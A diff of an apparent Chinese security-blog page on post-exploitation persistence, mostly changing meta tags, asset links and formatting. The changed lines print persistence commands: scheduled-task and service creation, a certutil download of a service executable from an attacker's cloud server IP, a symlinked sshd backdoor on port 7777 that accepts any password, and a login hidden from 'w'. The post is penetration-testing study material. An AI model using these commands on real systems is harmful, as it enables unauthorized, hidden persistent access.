@@ -17,12 +17,28 @@
 <meta property="og:description" content="注册表、计划任务、服务、影子账户、SSP、LLMNR 等常见后门与维持手段及排查方式。">
 <meta property="og:url" content="https://blogbu2154.site/persistence-techniques/">
 <meta property="og:site_name" content="swfk 的安全笔记">
-<meta property="og:image" content="/medias/featureimages/3.jpg">
-<meta name="twitter:card" content="summary">
+<meta property="og:locale" content="zh_CN">
+
+<meta property="og:image" content="https://blogbu2154.site/medias/featureimages/3.jpg">
+<meta property="og:image:alt" content="权限维持 - swfk 的安全笔记">
+
+
+<meta property="article:published_time" content="2026-01-28T06:23:38+08:00">
+<meta property="article:modified_time" content="2026-01-28T06:23:38+08:00">
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blogbu2154.site/medias/featureimages/3.jpg">
 <link rel="alternate" type="application/atom+xml" title="swfk 的安全笔记" href="/atom.xml">
 <link rel="stylesheet" href="/css/clay.css">
 
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css">
+<link rel="stylesheet" href="/aplayer/APlayer.min.css">
+
+
+<link rel="dns-prefetch" href="https://giscus.app">
+<link rel="preconnect" href="https://giscus.app" crossorigin>
+
+
+<link rel="dns-prefetch" href="https://busuanzi.ibruce.info">
 
 <script>
   // 尽早恢复主题，避免首屏闪烁
@@ -92,8 +108,6 @@
         <div class="post-meta">
           <time datetime="2026-01-28">2026-01-28</time>
           
-            <span>更新于 2026-08-29</span>
-          
         </div>
       </header>
       
@@ -105,10 +119,10 @@
 </blockquote>
 <span id="more"></span>
 
-<p>**权限维持是获取到操作系统最高管理员后进行的内网渗透操作 （实际工作中需要有明确授权才能进行该步骤）  **</p>
+<p><strong>权限维持是获取到操作系统最高管理员后进行的内网渗透操作 （实际工作中需要有明确授权才能进行该步骤）</strong></p>
 <h2 id="windows权限维持"><a href="#windows权限维持" class="headerlink" title="windows权限维持"></a>windows权限维持</h2><h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h2><h3 id="图形化"><a href="#图形化" class="headerlink" title="图形化"></a>图形化</h3><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><ul>
 <li><strong>at</strong>：windows  vista 之前的计划任务</li>
-<li>**schtasks：**windows  vista  之后的计划任务</li>
+<li><strong>schtasks：</strong> windows  vista  之后的计划任务</li>
 </ul>
 <p>windows的缓存：<code>C:\Windows\Temp</code></p>
 <h3 id="创建计划任务"><a href="#创建计划任务" class="headerlink" title="创建计划任务"></a>创建计划任务</h3><p><code>schtasks /create /tn 计划任务的名称 /tr 实际要运行的程序 /sc minute /mo 1  </code></p>
@@ -158,10 +172,10 @@ msf post(windows/manage/rid_hijack) &gt; options</code></pre>
 <p>cobaltstrike 也能实现</p>
 <p><code>sc create 服务名 binPath= &quot;exe的路径&quot; start= auto</code></p>
 <p>⚠️ binPath&#x3D; “exe的路径” 和 start&#x3D; auto 等于号的左边不能有空格，右边必须有空格</p>
-<p><strong>❌</strong>** start   &#x3D;   auto **</p>
-<p><strong>❌</strong>** start&#x3D;auto **</p>
-<p><strong>❌</strong>** start   &#x3D;auto **</p>
-<p><strong>✅</strong>** start&#x3D;   auto  **</p>
+<p>❌ <code>start   =   auto</code></p>
+<p>❌ <code>start=auto</code></p>
+<p>❌ <code>start   =auto</code></p>
+<p>✅ <code>start= auto</code></p>
 <p>certutil -urlcache -split -f http:&#x2F;&#x2F;云服务器IP:端口&#x2F;12_service.exe</p>
 <p>重启靶机等待</p>
 <p>不登录，服务就会自动启动</p>
@@ -175,10 +189,10 @@ msf post(windows/manage/rid_hijack) &gt; options</code></pre>
 <h2 id="ssh-软链接"><a href="#ssh-软链接" class="headerlink" title="ssh 软链接"></a>ssh 软链接</h2><p> 低版本的ssh服务中存在</p>
 <p>1  寻找sshd位置</p>
 <p>2  创建软链接</p>
-<p>** **<code>**ln -sf /usr/sbin/sshd /tmp/su  **</code></p>
-<p>**3  使用软链接启动新的 ssh 服务  **</p>
-<p>** <strong><code>**/tmp/su -oPort=7777**</code></strong>  **</p>
-<p>** 新启动的7777端口的ssh服务，是匿名服务，使用任意密码均可登录  **</p>
+<p><code>ln -sf /usr/sbin/sshd /tmp/su</code></p>
+<p><strong>3  使用软链接启动新的 ssh 服务</strong></p>
+<p><code>/tmp/su -oPort=7777</code></p>
+<p><strong>新启动的7777端口的ssh服务，是匿名服务，使用任意密码均可登录</strong></p>
 <h2 id="ssh-隐身登录"><a href="#ssh-隐身登录" class="headerlink" title="ssh 隐身登录"></a>ssh 隐身登录</h2><p><code>ssh   -T    用户名@ip地址   /bin/bash   -i</code></p>
 <p><strong>w 查看 登录（看不到）</strong></p>
 <h2 id="pam-后门"><a href="#pam-后门" class="headerlink" title="pam 后门"></a>pam 后门</h2><p>pam是什么： pam是linux的身份验证机制 （pam_unix.so）</p>
@@ -365,7 +379,7 @@ msf post(windows/manage/rid_hijack) &gt; options</code></pre>
 <script src="/js/clay.js"></script>
 <script src="/js/search.js"></script>
 
-<script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script>
+<script src="/aplayer/APlayer.min.js"></script>
 <script src="/js/music-loader.js"></script>
 
 
